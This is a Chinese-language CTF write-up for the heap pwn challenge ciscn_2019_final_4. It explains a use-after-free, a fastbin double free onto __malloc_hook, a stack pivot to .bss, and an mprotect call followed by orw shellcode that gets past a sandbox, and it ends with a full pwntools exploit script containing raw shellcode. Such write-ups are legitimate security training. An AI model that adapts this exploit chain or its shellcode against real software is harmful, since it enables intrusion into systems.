---
title: ciscn_2019_final_4
tags:
  - 栈堆结合
  - orw
  - 沙箱
  - double free
  - UAF
  - ROP
categories: buu刷题
abbrlink: d2d67d3f
---

### 保护策略：

![image-20221112144214948](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442042.png)

![image-20221112144230347](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442447.png)

### 程序分析：

![image-20221112144247139](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442191.png)

delete函数中存在一个UAF漏洞(如上)

![image-20221112144257829](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121442868.png)

在add函数中的size最大为0x1000,因此可以申请进入unsorted bin中的堆块，同时程序中存在show函数。

### 利用思路：

看其他师傅的wp，发现基本都是去拿到libc地址后泄露了一个栈地址(利用environ来泄露)。但其实这道题没有这么麻烦，并不需要泄露栈地址的，这里记录下利用思路。

首先让堆块进入unsorted bin，然后执行show函数来泄露libc地址。

由于本题开了沙箱，我们考虑用orw的方式，但是因为libc为2.23的，无法申请出来free_hook导致了没法用setcontext来设置寄存器打orw。

但是我们发现程序往栈里输入了大量的数据(如下),就给了我们rop的机会(尽管我们无法溢出控制返回地址)

![image-20221112144309646](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121443695.png)



在劫持malloc_hook之前我们拿到了libc地址，因此我们如果去劫持malloc_hook为add rsp,0x38;ret(0x38是调试出来的)，当下一次执行malloc的时候就会让栈顶增加0x38，然后执行ret的时候就可以劫持到我们最初输入的rop链上(如下)

![image-20221112144337170](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121443683.png)

此时我们有了libc地址，于是我们考虑用程序原本的gadget去执行一下read函数，将rop链读到bss段上，最后用pop rsp这个gadget让栈迁移到bss段进行第二次rop，而这次的rop链中我们就可以写入libc中的地址了，我采用的是执行了mprotect函数让bss段变成可读可写可执行的，后面紧跟着orw的shellcode即可。

总结一下这道题需要注意几点:

1. 写orw的shellcode时，要用close函数先关闭文件描述符0，再用openat系统调用(因为本题把open也给禁了，这个是在程序里实现的)去读出flag文件。
2. 本程序中，自己设置了一个反调试的功能，所以需要自己用ida把相关指令给nop掉，才能进行调试。
3. 最后栈迁移到bss段使用的是程序中原本的一个gadget: pop rsp



### EXP:

```py
from tools import *
context.log_level='debug'
p,e,libc=load("b","node4.buuoj.cn:25919","buu64-libc-2.23.so")

def add(size,content='/bin/sh\x00'):
    p.sendlineafter(">> ",str(1))
    p.sendlineafter("size?\n",str(size))
    p.sendafter("content?\n",content)

def show(index):
    p.sendlineafter(">> ",str(3))
    p.sendlineafter("index ?\n",str(index))

def delete(index):
    p.sendlineafter(">> ",str(2))
    p.sendlineafter("index ?\n",str(index))

pop_rdi=0x0000000000401193
pop_rsi_r15=0x0000000000401191
bss_addr=0x602080
pop_rsp_r13_r14_r15=0x000000000040118d
payload=p64(pop_rdi)+p64(0)
payload+=p64(pop_rsi_r15)+p64(bss_addr)+p64(0)
payload+=p64(e.plt['read'])
payload+=p64(pop_rsp_r13_r14_r15)
payload+=p64(bss_addr)
p.sendlineafter("what is your name? \n",payload)
add(0x800)
add(0x20)
add(0x60)
add(0x60)

delete(0)
show(0)
libc_base=recv_libc()-0x3c4b78
log_addr('libc_base')
add_rsp_ret=libc_base+0x0000000000143f08#0x0000000000143e08#
pop_rdx=libc_base+0x0000000000001b92
malloc_hook=libc_base+libc.symbols['__malloc_hook']
mprotect_addr=libc_base+libc.symbols['mprotect']

delete(2)#double free
delete(3)
delete(2)

add(0x60,p64(malloc_hook-0x23))
add(0x60)
add(0x60)
payload=b'a'*0x13+p64(add_rsp_ret)
add(0x60,payload)
debug(p,0x4010FB,0x4010EF,0x4010E3,0x400C11,0x400B2F)
p.sendlineafter(">> ",str(1))
p.sendlineafter("size?\n",str(0x10))
orw=b"\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05"
payload=p64(0)*3
payload+=p64(pop_rdi)+p64(0x602000)
payload+=p64(pop_rsi_r15)+p64(0x1000)+p64(0)
payload+=p64(pop_rdx)+p64(7)
payload+=p64(mprotect_addr)
payload+=p64(0x6020e0)
payload+=orw
sleep(0.2)
p.sendline(payload)
p.interactive()
```

![image-20221112144403666](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121444189.png)